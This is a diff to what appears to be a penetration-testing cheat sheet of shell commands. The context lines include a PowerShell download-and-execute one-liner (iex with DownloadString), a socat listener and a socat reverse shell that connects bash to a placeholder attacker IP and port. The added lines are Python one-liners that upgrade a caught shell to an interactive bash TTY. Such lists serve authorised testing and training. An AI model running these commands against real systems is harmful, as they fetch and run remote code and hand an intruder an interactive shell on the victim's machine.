@@ -19,3 +19,7 @@ powershell.exe -exec Bypass -C "iex (New-Object Net.WebClient).DownloadString('h
 sudo socat file:`tty`,raw,echo=0 tcp-listen:<Port>
 ## SOCAT 2
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP Address>:<Port>
+# TTY Upgrades
+## PYTHON
+python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
